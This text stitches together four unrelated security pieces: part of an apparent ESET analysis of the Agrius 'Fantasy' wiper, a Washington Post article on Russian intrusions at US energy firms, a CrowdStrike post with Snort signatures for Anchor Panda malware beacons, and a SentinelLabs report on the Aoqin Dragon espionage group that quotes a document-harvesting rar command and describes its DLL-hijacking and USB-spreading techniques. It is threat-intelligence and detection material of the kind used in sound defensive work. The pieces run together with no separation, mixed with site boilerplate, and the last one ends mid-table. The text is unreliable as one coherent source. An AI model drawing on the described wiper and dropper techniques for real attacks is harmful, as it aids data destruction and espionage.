The base64 string that follows fantasy35.exe is likely a relic of the execution requirements of Apostle (more details in the Attribution to Agrius section). However, the Fantasy wiper only looks for an argument of 411 and ignores all other runtime input (see the next section for more information).
Fantasy wiper
The Fantasy wiper is also a 32-bit Windows executable written in C#/.NET, so named for its filenames: fantasy45.exe and fantasy35.exe , respectively. Figure 3 depicts the execution flow of the Fantasy wiper.
Figure 3. Fantasy wiper execution flow
Initially, Fantasy creates a mutex to ensure that only one instance is running. It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists. Then it enters a for loop iterating over the drive list to build a recursive directory listing, and uses the RNGCryptoServiceProvider.GetBytes method to create a cryptographically strong sequence of random values in a 4096-byte array. If a runtime argument of 411 is supplied to the wiper, the for loop overwrites the contents of every file with the aforementioned byte array using a nested while loop. Otherwise, the for loop only overwrites files with a file extension listed in the Appendix.
Fantasy then assigns a specific timestamp ( 2037-01-01 00:00:00 ) to these file timestamp properties:
CreationTime
LastAccessTime
LastWriteTime
CreationTimeUtc
SetLastAccessTimeUtc
LastWriteTimeUtc
and then deletes the file. This is presumably done to make recovery and forensic analysis more difficult.
During the for loop, the Fantasy wiper counts errors within the current directory when attempting to overwrite files. If the number of errors exceeds 50, it writes a batch file, %WINDOWS%\Temp\<GUID>.bat , that deletes the directory with the files causing the errors, and then self-deletes. File wiping then resumes in the next directory in the target list.
Once the for loop completes, the Fantasy wiper creates a batch file in %WINDOWS%\Temp called registry.bat . The batch file deletes the following registry keys:
HKCR\.EXE
HKCR\.dll
HKCR\*
Then it runs the following to attempt to clear file system cache memory:
%windir%\system32\rundll32.exe advapi32.dll,ProcessIdleTasks
Lastly, registry.bat deletes itself ( del %0 ).
Next, the Fantasy wiper clears all Windows event logs and creates another batch file, system.bat , in %WINDOWS%\Temp , that recursively deletes all files on %SYSTEMDRIVE% , attempts to clear file system cache memory, and self-deletes. Then Fantasy sleeps for two minutes before overwriting the system’s Master Boot Record .
Fantasy then writes another batch file, %WINDOWS%\Temp\remover.bat , that deletes the Fantasy wiper from disk and then deletes itself. Then Fantasy wiper sleeps for 30 seconds before rebooting the system with reason code SHTDN_REASON_MAJOR_OTHER (0x00000000) — Other issue .
It is likely that %SYSTEMDRIVE% recovery is possible. Victims were observed to be back up and running within a matter of hours.
Attribution to Agrius
Much of the code base from Apostle, initially a wiper masquerading as ransomware then updated to actual ransomware, was directly copied to Fantasy and many other functions in Fantasy were only slightly modified from Apostle, a known Agrius tool . However, the overall functionality of Fantasy is that of a wiper without any attempt to masquerade as ransomware. Figure 4 shows the file deletion functions in Fantasy and Apostle, respectively. There are only a few small tweaks between the original function in Apostle and the Fantasy implementation.
Figure 4. File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green)
Figure 4. File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green)
Figure 5 shows that the directory listing function is almost a direct copy, with only the function variables getting a slight tweak between Apostle and Fantasy.
Figure 5. Directory listing functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green)
Finally, the GetSubDirectoryFileListRecursive function in Figure 6 is also almost an exact copy.
Figure 6. Recursive directory listing functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green)
In addition to the code reuse, we can see remnants of the Apostle execution flow in Fantasy. In the original analysis of Apostle, SentinelOne notes that “ Proper execution of the ransomware version requires supplying it with a base64 encoded argument containing an XML of an ‘RSAParameters’ object. This argument is passed on and saved as the Public Key used for the encryption process and is most likely generated on a machine owned by the threat actor. ” We can see in the batch file in Figure 7, which Sandals creates on remote systems to launch Fantasy, that the same base64-encoded argument containing an XML of an RSAParameters object is passed to Fantasy at runtime. Fantasy, however, does not use this runtime argument.
Figure 7. Sandals passing to Fantasy the same RSAParameters object as was used by Apostle ransomware
Conclusion
Since its discovery in 2021, Agrius has been solely focused on destructive operations. To that end, Agrius operators probably executed a supply-chain attack by targeting an Israeli software company’s software updating mechanisms to deploy Fantasy, its newest wiper, to victims in Israel, Hong Kong, and South Africa. Fantasy is similar in many respects to the previous Agrius wiper, Apostle, that initially masqueraded as ransomware before being rewritten to be actual ransomware. Fantasy makes no effort to disguise itself as ransomware. Agrius operators used a new tool, Sandals, to connect remotely to systems and execute Fantasy.
For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com .
ESET Research also offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the ESET Threat Intelligence page.
1A62031BBB2C3F55D44F59917FD32E4ED2041224 fantasy35.exe MSIL/KillDisk.I Fantasy wiper.
820AD7E30B4C54692D07B29361AECD0BB14DF3BE fantasy45.exe MSIL/KillDisk.I Fantasy wiper.
1AAE62ACEE3C04A6728F9EDC3756FABD6E342252 host2ip.exe clean Resolves a hostname to an IP address.
5485C627922A71B04D4C78FBC25985CDB163313B MiniDump.exe MSIL/Riskware.LsassDumper.H Implementation of Mimikatz minidump that dumps credentials from LSASS.
DB11CBFFE30E0094D6DE48259C5A919C1EB57108 registry.bat BAT/Agent.NRG Batch file that wipes some registry keys and is dropped and executed by the Fantasy wiper.
3228E6BC8C738781176E65EBBC0EB52020A44866 secretsdump.py Python/Impacket.A Python script that dumps credential hashes.
B3B1EDD6B80AF0CDADADD1EE1448056E6E1B3274 spchost.exe MSIL/Agent.XH Sandals lateral movement tool and Fantasy spreader.
MITRE ATT&CK techniques
This table was built using version 12 of the MITRE ATT&CK framework.
Resource Development T1587 Develop Capabilities Agrius builds utility tools to use during an active exploitation process.
T1587.001 Develop Capabilities: Malware Agrius builds custom malware including wipers (Fantasy) and lateral movement tools (Sandals).
Initial Access T1078.002 Valid Accounts: Domain Accounts Agrius operators attempted to capture cached credentials and then use them for lateral movement.
T1078.003 Valid Accounts: Local Accounts Agrius operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network.
Execution T1059.003 Command and Scripting Interpreter: Windows Command Shell Fantasy and Sandals both use batch files that run via the Windows command shell.
Privilege Escalation T1134 Access Token Manipulation Fantasy uses the LookupPrivilegeValue and AdjustTokenPrivilege APIs in advapi32.dll to grant its process token the SeShutdownPrivilege to reboot Windows.
Defense Evasion T1070.006 Indicator Removal on Host: Timestomp Agrius operators timestomped the compilation timestamps of Fantasy and Sandals.
Credential Access T1003 OS Credential Dumping Agrius operators used several tools to dump OS credentials for use in lateral movement.
Discovery T1135 Network Share Discovery Agrius operators used cached credentials to check for access to other systems within an internal network.
Lateral Movement T1021.002 Remote Services: SMB/Windows Admin Shares Agrius operators used cached credentials to connect over SMB to systems within an exploited internal network.
T1570 Lateral Tool Transfer Agrius operators used Sandals to push batch files over SMB to other systems within an internal network.
Impact T1485 Data Destruction The Fantasy wiper overwrites data in files and then deletes the files.
T1561.002 Disk Wipe Fantasy wipes the MBR of the Windows drive and attempts to wipe the OS partition.
T1561.001 Disk Wipe: Disk Content Wipe Fantasy wipes all disk contents from non-Windows drives that are fixed drives.
T1529 System Shutdown/Reboot Fantasy reboots the system after completing its disk and data wiping payloads.
Appendix
File extensions (682) targeted by Fantasy wiper when not targeting all file extensions. File extensions highlighted in yellow (68) are common filename extensions in Windows . Notably absent are file extensions dll and sys .
Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource CenterThe National Security Agency campus in Fort Meade, Md. (Patrick Semansky/AP) By Ellen Nakashima Ellen Nakashima National security reporter Email Bio Follow July 8, 2017 Russian government hackers were behind recent cyber-intrusions into the business systems of U.S. nuclear power and other energy companies in what appears to be an effort to assess their networks, according to U.S. government officials. The U.S. officials said there is no evidence the hackers breached or disrupted the core systems controlling operations at the plants, so the public was not at risk. Rather, they said, the hackers broke into systems dealing with business and administrative tasks, such as personnel. At the end of June, the FBI and the Department of Homeland Security sent a joint alert to the energy sector stating that “advanced, persistent threat actors” — a euphemism for sophisticated foreign hackers — were stealing network log-in and password information to gain a foothold in company networks. The agencies did not name Russia. The campaign marks the first time Russian government hackers are known to have wormed their way into the networks of American nuclear power companies, several U.S. and industry officials said. And the penetration could be a sign that Russia is s eeking to lay the groundwork for more damaging hacks. The National Security Agency has detected specific activity by the Russian spy agency, the FSB, targeting the energy firms, according to two officials. The NSA declined to comment. The intrusions have been previously reported but not the attribution to Russia by U.S. officials. 1 of 45 Full Screen Autoplay Close Skip Ad ×
Embed Copy Share See President Trump in Europe for the G-20 economic summit View Photos The president made his way to Germany for the meeting of world leaders after a stop in Poland. Caption The president made his way to Germany for the meeting of world leaders after a stop in Poland. July 8, 2017 President Trump waves as he and first lady Melania Trump arrive at Joint Base Andrews in Maryland after the G-20 economic summit. Evan Vucci/AP Wait 1 second to continue. The joint alert from the FBI and DHS, first reported by Reuters on June 30, said the hackers have been targeting the industry since at least May. Several days earlier, E & E News, an energy trade publication, had reported that U.S. authorities were investigating cyber-intrusions affecting multiple nuclear-power-generation sites. [ Ukraine’s ransomware attack was a ruse to hide culprit’s identity, researchers say ] The malicious activity comes as President Trump and Russian President Vladimir Putin on Friday acknowledged “the challenges of cyberthreats” and “agreed to explore creating a framework” to better deal with them, including those that harm critical infrastructure such as nuclear energy, according to Secretary of State Rex Tillerson in remarks to reporters. On Saturday, Putin told reporters that he and Trump agreed to set up a working group “on the subject of jointly controlling security in cyberspace.” The Russian government, which is the United States’ top adversary in cyberspace, targeted U.S. infrastructure in a wide-ranging campaign in 2014. Moscow has demonstrated how much damage it can do in other countries when it goes after energy systems. In December 2015, Russian hackers disrupted the electric system in Ukraine, plunging 225,000 customers into darkness. Last December, they tested a new cyberweapon in Kiev, the Ukrainian capital, capable of disrupting power grids around the world. The recent activity follows the U.S. intelligence community’s conclusion that the Kremlin was behind a campaign to interfere with the 2016 election through hacking and information warfare. Putin has denied such meddling.
Decoding Internet Security: Spear phishing Here is what you need to know about spear phishing: a targeted attack hackers use to steal your personal information.
Here is what you need to know about spear phishing: a targeted attack hackers use to steal your personal information. (Sarah Parnass, Dani Player/The Washington Post)
(Sarah Parnass,Dani Player/The Washington Post) The working group that is being set up will also address “how to prevent interference in the domestic affairs of foreign states, primarily in Russia and the U.S.,” Putin said. The U.S. officials all stressed that the latest intrusions did not affect systems that control the production of nuclear or electric power. “There is no indication of a threat to public safety, as any potential impact appears to be limited to administrative and business networks,” the DHS and FBI said in a joint statement Friday. One nuclear power company that was penetrated, Wolf Creek Nuclear Operating Corp. in Kansas, issued a statement saying that “there has been absolutely no operational impact to Wolf Creek.” The reason is that the plant’s operational computer systems are completely separate from the corporate network, spokeswoman Jenny Hageman said. “The safety and control systems for the nuclear reactor and other vital plant components are not connected to business networks or the Internet,” she said. In general, the nation’s 100 or so commercial nuclear power plants are safer from cyberattack than other energy plants because they isolate their control systems from the open Internet, said Bill Gross, director of incident preparedness at the Nuclear Energy Institute. According to U.S. officials, fewer than a dozen energy companies, including several nuclear energy firms, were affected by the latest Russian cyber-reconnaissance campaign. [ Companies struggle to recover after massive cyberattack with ransom demands ] While nuclear-power companies are fairly well protected, electric-power plants are less so, experts said. “It’s a plausible scenario that the adversaries in electric power business networks could pivot to the industrial networks,” said Robert M. Lee, founder and chief executive of Dragos, a cyberfirm that focuses on industrial control systems. “But it’s still not a trivial matter to compromise the industrial systems.” Dragos last month issued a report analyzing a new Russian cyberweapon that can disrupt electric power grids. Dubbed CrashOverride, the malware is known to have affected only one energy system — in Ukraine in December. But with modifications, it could be deployed against U.S. electric grids, Dragos concluded. While the current campaign shows no signs — at least not yet — of disrupting the companies’ operations, it is not clear what the adversary’s true motive is, officials said. “In some sense, this could be significant if this is precursor planning,” said one U.S. official, who like others interviewed spoke on the condition of anonymity to discuss a sensitive topic. “That’s what all cyber bad guys do. They do reconnaissance and they try to establish a presence and maintain access. This in my mind was a reconnaissance effort — to scope things out and figure out” points of entry. The same actor has also targeted energy and other critical sector firms in Turkey and Ireland, said John Hultquist, director of intelligence analysis at FireEye, a cyberthreat-intelligence firm. He added that the firm has found evidence that the adversary has been hacking into global energy firms since at least 2015. In their alert, the DHS and FBI stated that the hackers are using spearphishing emails and “watering hole” techniques to ensnare victims. A spearphish targets a user with an authentic-looking email that contains attachments or links embedded with malware. In this case, the hackers often used Microsoft Word attachments that appeared to be legitimate résumés from job applicants, the agencies said. In a watering-hole attack, an unsuspecting victim navigates to a website laced with malware, infecting his or her computer. In both cases, the adversary sought to collect victims’ log-in and password data so that they could sneak in to the network and poke around. Galina Antova, co-founder of the cyberfirm Claroty, said: “There’s no need for hype and hysteria, but this is an issue that should be taken seriously because of the state of the industrial networks” — in particular the non-nuclear systems. The current cyber-campaign, dubbed Palmetto Fusion by the government, is significant as a warning, officials said. “It signals an ability to get into a system and potentially have a continued presence there, which at a future date, at someone else’s determination, might be exploited to have an effect” that could be particularly disruptive. David Filipov and Damian Paletta in Hamburg contributed to this report. We are a participant in the Amazon Services LLC Associates Program, an affiliate advertising program designed to provide a means for us to earn fees by linking to Amazon.com and affiliated sites. 0 Comment s world national-security Get the Today's Headlines Newsletter Thank You! You are now subscribed to Get the Today's Headlines Newsletter Please enter a valid email address You might also like... Sign up See all newsletters By signing up you agree to our Terms of Use and Privacy Policy Ellen Nakashima Ellen Nakashima is a national security reporter with The Washington Post. She was a member of two Pulitzer Prize-winning teams, in 2018 for coverage of Russia's interference in the 2016 election, and in 2014 and for reporting on the hidden scope of government surveillance. Follow The Post Recommends
Experts say police response in Nashville was ‘exact opposite’ to Uvalde
Body-camera footage shows Nashville police officers rushing to confront an elementary school shooter armed with two assault-style weapons. 9 hours ago
We will stop at nothing to protect the children
Imagine if students read a banned book, or viewed provocative art, or learned some upsetting history — and then went safely home again? So awful. 12 hours ago
A mostly hidden problem wastes appalling amounts of water
It's bad not only for your wallet, but also for your health. What is your state doing about it? 18 hours agoAnchor Panda is an adversary that CrowdStrike has tracked extensively over the last year targeting both civilian and military maritime operations in the green/brown water regions primarily in the area of operations of the South Sea Fleet of the PLA Navy . In addition to maritime operations in this region, Anchor Panda also heavily targeted western companies in the US, Germany, Sweden, the UK, and Australia, and other countries involved in maritime satellite systems, aerospace companies, and defense contractors.
Not surprisingly, embassies and diplomatic missions in the region, foreign intelligence services, and foreign governments with space programs were also targeted. We won’t share too many details about this adversary – we don’t want to make it too easy for them – but we will share some signatures specific to Anchor Panda. These signatures will help you find Anchor Panda, just remember to change the Signature ID (sid).
alert tcp $VICTIM any -> $CONTROLLER any (msg: "[CrowdStrike] ANCHOR PANDA - Adobe Gh0st Beacon"; flow: established, to_server; content: "Adobe"; offset: 0; depth: 5; content: "|e0 00 00 00 78 9c|"; distance: 4; within: 15; sid: xxx; rev: 1; reference: url,http://blog.crowdstrike.com/whois-anchor-panda/index.html; )
alert tcp $CONTROLLER any -> $VICTIM any (msg: "[CrowdStrike] ANCHOR PANDA - Poison Ivy Keep-Alive - From Controller"; dsize: 48; flow: established, from_server; content: "|54 90 1d b0 18 1b 7c ce f4 5b 24 2f ec c7 d2 21|"; depth: 16; sid: xxx; rev: 1; reference: url,http://blog.crowdstrike.com/whois-anchor-panda/index.html; )
alert tcp $VICTIM any -> $CONTROLLER any (msg: "[CrowdStrike] ANCHOR PANDA - Poison Ivy Keep-Alive - From Victim"; dsize: 48; flow: established, to_server; content: "|af c0 bb 65 5d 07 e0 0d bf ab 75 2f 82 79 ae 26|"; depth: 16; sid: xxx; rev: 1; reference: url,http://blog.crowdstrike.com/whois-anchor-panda/index.html; )
alert tcp $VICTIM any -> $CONTROLLER any (msg: "[CrowdStrike] ANCHOR PANDA Torn RAT Beacon Message Header Local"; flow: established, to_server; dsize: 16; content: "|00 00 00 11 c8 00 00 00 00 00 00 00 00 00 00 00|"; depth: 16; flowbits: set,toread_header; flowbits: noalert; sid: xxx; rev: 1; reference: url,http://blog.crowdstrike.com/whois-anchor-panda/index.html; )
alert tcp $VICTIM any -> $CONTROLLER any (msg: "[CrowdStrike] ANCHOR PANDA Torn RAT Beacon Message"; dsize: 200; flow: to_server,established; flowbits: isset,toread_header; content: "|40 7e 7e 7e|"; offset: 196; depth: 4; sid: xxx; rev: 1; reference: url, http://blog.crowdstrike.com/whois-anchor-panda/index.html; )
Other Known China-based Adversaries
Curious about other nation-state adversaries? Visit our threat actor hub to learn about the new adversaries that the CrowdStrike team discovers.
Be sure to follow @CrowdStrike on Twitter as we continue to provide more intelligence and adversaries over the coming weeks. If you have any questions about these signatures or want to hear more about Anchor Panda and their tradecraft, please contact: intelligence@crowdstrike.com and inquire about our intelligence-as-a-service solutions.
Featured Articles CrowdStrike’s Artificial Intelligence Tooling Uses Similarity Search to Analyze Script-Based Malware Attack Techniques 三月 23, 2023 CrowdStrike and Dell: Making Cybersecurity Fast and Frictionless 三月 23, 2023 VP of Legal Jeanne Miller-Romero on Women’s History Month and Being a Woman in Leadership 三月 22, 2023 CrowdStrike Extends Identity Security Innovations to Protect Customers and Stop Breaches 三月 20, 2023
SUBSCRIBE
Sign up now to receive the latest notifications and updates from CrowdStrike.
Sign Up
See CrowdStrike Falcon® in Action
Detect, prevent, and respond to attacks— even malware-free intrusions—at any stage, with next-generation endpoint protection.
See Demo
Cookie Settings
Share Or Sale of Personal Data Do Not Sell Or Share My Personal Information:
If you would like to opt-out of the sale or sharing of your personal information, please email your request to privacy@crowdstrike.com and provide your first name, last name and email address. If you do not provide the requested information, we may not be able to identify you and process your request. The information you provide will be used only to help verify and process your request. For more information about our privacy practices, please review our Privacy Notice.
Opt-Out Preference Signal (Global Privacy Control):
You may use an Opt-Out Preference Signal, such as the Global Privacy Control ("GPC"), to opt-out of the sharing of your personal information.
Unless you have previously provided your personal information to CrowdStrike, such as by signing up for a Free Trial, downloading a white paper or registering to attend a webinar, your request to opt-out via GPC will be linked to your browser identifier only because CrowdStrike does not have any of your personal information to associate your GPC opt-out with.
Email Preferences:
To manage your email preferences, please click Email Preferences. Cookie Settings
Strictly Necessary Cookies Always Active These cookies are necessary for the website to function and cannot be switched off in our systems. This includes diagnostic functions such as identifying 404 errors and monitoring page load speed. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, logging in or filling in forms. You can set your browser to block or alert you about these cookies, but some parts of the site will not then work. These cookies do not store any personally identifiable information.
Performance Cookies label These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site. They help us to know which pages are the most and least popular and see how visitors move around the site. All information these cookies collet is aggregated and therefore anonymous. If you do not allow these cookies we will not know when you have visited our site, and will not be able to monitor its performance.
Functional Cookies label These cookies enable the website to provide enhanced functionality and personalisation. They may be set by us or by third party providers whose services we have added to our pages. If you do not allow these cookies then some or all of these services may not function properly.
Targeting Cookies label These cookies may be set through our site by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant adverts on other sites. They do not store directly personal information, but are based on uniquely identifying your browser and internet device. If you do not allow these cookies, you will experience less targeted advertising.
Back Button Back Filter Button
Consent Leg.Interest label label label
Clear label Apply CancelAoqin Dragon, a threat actor SentinelLabs has been extensively tracking, has operated since 2013 targeting government, education, and telecommunication organizations in Southeast Asia and Australia.
Aoqin Dragon seeks initial access primarily through document exploits and the use of fake removable devices.
Other techniques the attacker has been observed using include DLL hijacking, Themida-packed files, and DNS tunneling to evade post-compromise detection.
Based on our analysis of the targets, infrastructure and malware structure of Aoqin Dragon campaigns, we assess with moderate confidence the threat actor is a small Chinese-speaking team with potential association to UNC94 (Mandiant).
Overview
SentinelLabs has uncovered a cluster of activity beginning at least as far back as 2013 and continuing to the present day, primarily targeting organizations in Southeast Asia and Australia. We assess that the threat actor’s primary focus is espionage and relates to targets in Australia, Cambodia, Hong Kong, Singapore, and Vietnam. We track this activity as ‘Aoqin Dragon’.
The threat actor has a history of using document lures with pornographic themes to infect users and makes heavy use of USB shortcut techniques to spread the malware and infect additional targets. Attacks attributable to Aoqin Dragon typically drop one of two backdoors, Mongall and a modified version of the open source Heyoka project.
Threat Actor Infection Chain
Throughout our analysis of Aoqin Dragon campaigns, we observed a clear evolution in their infection chain and TTPs. We divide their infection strategy into three parts.
Using a document exploit and tricking the user into opening a weaponized Word document to install a backdoor.
Luring users into double-clicking a fake Anti-Virus to execute malware in the victim’s host.
Forging a fake removable device to lure users into opening the wrong folder and installing the malware successfully on their system.
Initial Access via Exploitation of Old and Unpatched Vulnerabilities
During 2012 to 2015, Aoqin Dragon relied heavily on CVE-2012-0158 and CVE-2010-3333 to compromise their targets. In 2014, FireEye published a blog detailing related activity using lure documents themed around the disappearance of Malaysia Airlines Flight MH370 to conduct their attacks. Although those vulnerabilities are very old and were patched before being deployed by Aoqin Dragon, this kind of RTF-handling vulnerability decoy was very common in that period.
There are three interesting points that we discovered from these decoy documents. First, most decoy content is themed around targets who are interested in APAC political affairs. Second, the actors made use of lure documents themed to pornographic topics to entice the targets. Third, in many cases, the documents are not specific to one country but rather the entirety of Southeast Asia.
APAC Themed Lure Document
Pornographic-themed Lure Document
Executables Masked With Fake Icons
The threat actor developed executable files masked with document file icons such as Windows folders and Anti-Virus vendor icons, acting as droppers to execute a backdoor and connect to the C2 server. Although executable files with fake file icons have been in use by a variety of actors, it remains an effective tool especially for APT targets. Combined with “interesting” email content and a catchy file name, users can be socially engineered into clicking on the file.
Executable dropper with different fake security product icons
Typically, a script containing a rar command is embedded in the executable dropper with different fake security product icons. Based on the script contained in the executable, we can identify the main target type of document formats they were trying to find, such as Microsoft Word documents.
rar .exe a -apC -r -ed -tk -m5 -dh -tl -hpThis0nePiece -ta20180704 C :\ DOCUME ~1\ ALLUSE ~1\ DRM \ Media \ B9CC6F75 .ldf C :\* .doc C :\* .DOCX
Moreover, the dropper employs a worm infection strategy using a removable device to carry the malware into the target’s host and facilitate a breach into the secure network environment. We also found the same dropper deploying different backdoors including the Mongall backdoor and a modified Heyoka backdoor.
Removable Device as an Initial Vector
From 2018 to present, this actor has also been observed using a fake removable device as an initial infection vector. Over time, the actor upgraded the malware to protect it from being detected and removed by security products.
Here’s a summary of the attack chain of recent campaigns:
A Removable Disk shortcut file is made which contains a specific path to initiate the malware.
When a user clicks the fake device, it will execute the “Evernote Tray Application” and use DLL hijacking to load the malicious loader as . encrashrep.dll explorer.exe
After executing the loader, it will check if it is in any attached removable devices.
If the loader is not in the removable disk, it will copy all the modules under , which includes normal files, the backdoor loader and an encrypted backdoor payload. "%USERPROFILE%\AppData\Roaming\EverNoteService\"
The malware sets the auto start function with the value “EverNoteTrayUService”. When the user restarts the computer, it will execute the “Evernote Tray Application” and use DLL hijacking to load the malicious loader.
The loader will check the file path first and decrypt the payloads. There are two payloads in this attack chain: the first payload is the spreader, which copies all malicious files to removable devices; the second one is an encrypted backdoor which injects itself into rundll32’s memory.
Newest infection chain flow
Using USB shortcut techniques to spread the malware and infect target victims
Use a shortcut file to fake removable disc icon and change Evernote application name to RemovableDisc.exe
The spreader component will try to find the removable device in the victim’s environment. This malware component will copy all the malicious modules to any removable device to spread the malware in the target’s network environment, excluding Drive A. The threat actor names this component “upan”, which we observe in the malware’s PDB strings.
C :\ Users \ john \ Documents \ Visual Studio 2010\ Projects \ upan_dll_test \ Debug \ upan .pdb
Malware Analysis
Aoqin Dragon rely heavily on the DLL hijacking technique to compromise targets and run their malware of choice. This includes their newest malware loader, Mongall backdoor, and a modified Heyoka backdoor.
DLL-test.dll Loader
The loader is notable because it is used to initiate the infection chain. When a victim has been compromised, will check that the host drive is not A and test whether the drive is removable media or not. After these checks are complete, the loader opens the Removable Disk folder to simulate normal behavior. It then copies all modules from the removable drive to the “EverNoteService” folder. The loader will set up an auto start for “EverNoteTrayService” as a form of persistence following reboots. DLL-test.dll DLL-test.dll
After decrypting the encrypted payload, will execute and run specific export functions. The loader injects the decrypted payload into memory and runs it persistently. The payload we found in this operation included a Mongall backdoor and a modified Heyoka backdoor. DLL-test.dll rundll32.exe
We found that the code injection logic is identical to that in the book WINDOWS黑客编程技术详解 (Windows Hacking Programming Techniques Explained), Chapter 4, Section 3, which describes how to use memory to directly execute a DLL file. We also found the same code on GitHub. A debug string inside the DLL-test loader provides further evidence that this is the source of the code in the malware.
C :\ users \ john \ desktop \ af \ dll_test_hj3 \ dll_test \ memloaddll .cpp
C :\ users \ john \ desktop \ af \ dll_test_hj3 - 不过 uac 不写注册表\ dll_test \ memloaddll .cpp
C :\ users \ john \ desktop \ af \ dll_test - upan - 单独 - 老黑的版本\ dll_test \ memloaddll .cpp
As stated above, the debug strings inside loader provide interesting information about Aoqin Dragon TTPs. The loaders contain both debug strings and embedded PDB strings that give us further information of this loader’s features and which backdoor will be decrypted. For instance, “DLL_test loader for Mongall”, “DLL_test loader for Mongall but can’t bypass UAC and can’t add itself to registry”, “DLL-test loader for upan component” and “DLL-test for DnsControl”, which is a modified Heyoka backdoor. DLL-test.dll
C:\Documents and Settings\Owner\桌面\DLL_test\ Release \DLL_test.pdb
C:\ Users \john\Desktop\af\DLL_test_hj3\Debug\DLL_test.pdb
C:\ Users \john\Desktop\af\DLL_test - upan -单独 - 老黑的版本\Debug\DLL_test.pdb
C:\ Users \john\Desktop\af\DLL_test - upan -单独 - 老黑的版本\ Release \DLL_test.pdb
C:\ Users \john\Desktop\af\DLL_test_hj3 -不过UAC 不写注册表\Debug\DLL_test.pdb
D:\ 2018 \DnsControl\DNS20180108\DLL_test\ Release \DLL_test.pdb
Mongall Backdoor
Mongall is a small backdoor going back to 2013, first described in a report by ESET. According to the report, the threat actor was trying to target the Telecommunications Department and the Vietnamese government. More recently, Aoqin Dragon has been reported targeting Southeast Asia with an upgraded Mongall encryption protocol and Themida packer.
Mongall backdoor has four different mutexes and different notes in each backdoors – notes are shown in the IOC table. Based on the notes, we can estimate malware creation time, intended targets, Mongall backdoor versions and related C2 domain name.
The backdoor mutex and information collection
The actors name this backdoor , and the backdoor name matches the PDB strings mentioned earlier. In addition, there are some notes containing “HJ” strings inside the backdoor. HJ-client.dll
Although Mongall is not particularly feature rich, it is still an effective backdoor. It can create a remote shell, upload files to the victim’s machine and download files to the attacker’s C2. Most important of all, this backdoor embedded three C2 servers for communication. Below is the Mongall backdoor function description and command code.
Mongall backdoor function capability
We discovered that the Mongall backdoor’s network transmission logic could be found on the Chinese Software Developer Network (CSDN). Compared to the old Mongall backdoor, the new version upgrades the encryption mechanism. However, new versions of Mongall still use GET protocol to send the information back with RC4 to encrypt or base64 to encode the victim machine’s information. There is another interesting finding when we analyze Mongall backdoor: the encryption or encode logic is compared to the mutex of Mongall. Here is the table of mutex and transform data logic.
Mutex
Algorithm
Faking a C2 server allowed us to capture Mongall beacon messages and develop a Python decryption script to reveal each version of the message. Alongside this report, we are publicly releasing the script here . Below shows the encrypted strings and description beacon information.
Decrypting the embedded beacon information
Modified Heyoka Backdoor
We also observed another backdoor used by this threat actor. This backdoor is totally different from Mongall, as we found it is based on the Heyoka open source project . Heyoka is a proof-of-concept of an exfiltration tool which uses spoofed DNS requests to create a bidirectional tunnel. The threat actors modified and redesigned this tool to be a custom backdoor using DLL injection technique to deploy it in the victim’s environment. Simplified Chinese characters can be found in its debug log.
Left:the modified backdoor information; Right: the Heyoka source code
Debug information with simplified Chinese characters
This backdoor was named by its developers. They not only expanded its functionality but also added two hardcoded C2s. The backdoor checks if it is run as system service or not, to make sure it has sufficient privileges and to keep itself persistent. The modified Heyoka backdoor is much more powerful than Mongall. Although both have shell ability, the modified Heyoka backdoor is generally closer to a complete backdoor product. The commands available in the modified Heyoka backdoor are tabulated below. srvdll.dll
Command code
Description
Hardcoded command and control server in modified Heyoka backdoor
Backdoor with the DNS tunneling connection
Attribution
Throughout the analysis of Aoqin Dragon operations, we came across several artifacts linking the activity to a Chinese-speaking APT group as detailed in the following sections.
Infrastructure
One of Mongall’s backdoors was observed by Unit42 in 2015 . They claim the president of Myanmar’s website had been used in a watering hole attack on December 24, 2014. The attacker injected a JavaScript file with a malicious iframe to exploit the browsers of website visitors. In addition, they were also aware that another malicious script had been injected into the same website in November 2014, leveraging CVE-2014-6332 to download a trojan horse to the target’s host.
In 2013, there was a News talk about this group and the results of a police investigation . Police retrieved information from the C2 server and phishing mail server operators located in Beijing, China. The two primary backdoors used in this operation have overlapping C2 infrastructure, and most of the C2 servers can be attributed to Chinese-speaking users.
Two major backdoor C2s overlap
C2 attributed to Chinese-speaking users
Targeting and Motives
The targeting of Aoqin Dragon closely aligns with the Chinese government’s political interests. We primarily observed Aoqin Dragon targeting government, education, and telecommunication organizations in Southeast Asia and Australia.
Considering this long-term effort and continuous targeted attacks for the past few years, we assess the threat actor’s motives are espionage-oriented.
Conclusion
Aoqin Dragon is an active cyberespionage group that has been operating for nearly a decade. We have observed the Aoqin Dragon group evolve TTPs several times in order to stay under the radar. We fully expect that Aoqin Dragon will continue conducting espionage operations. In addition, we assess it is likely they will also continue to advance their tradecraft, finding new methods of evading detection and stay longer in their target network. SentinelLabs continues to track this activity cluster to provide insight into their evolution.
Indicators of Compromise
Malware Family
Initial Access
T1566 – Phishing
Threat actor use fake icon executable and document exploit as a decoy
Initial Access
T1091 – Replication Through Removable Media
Copies malware to removable media and infects other machines
Persistence
T1547 – Boot or Logon Autostart Execution
Settings to automatically execute a program during logon
Privilege Escalation
T1055 – Process Injection
Mongall has injected an install module into a newly created process.
Privilege Escalation
T1055.001 – Dynamic-link Library Injection
Mongall has injected a DLL into rundll32.exe
Defense Evasion
T1211 – Exploitation for Defense Evasion
Uses document exploits to bypass security features.
Defense Evasion
T1027 – Obfuscated Files or Information
Actors using Thimda packer to pack the malwares
Defense Evasion
T1055 – Process Injection
Using DLL hijacking to to evade process-based defenses
Discovery
T1082 – System Information Discovery
Collecting OS system version and MAC address
Command and Control
T1071.001 – Application Layer Protocol: Web Protocols
Mongall communicates over HTTP
Command and Control
T1071.004 – Application Layer Protocol: DNS
Modified Heyoka has used DNS tunneling for C2 communications.
Command and Control
T1571 – Non-Standard Port
Mongall uses port 5050,1352, etc. to communicates with C2
Command and Control
T1132 – Data Encoding
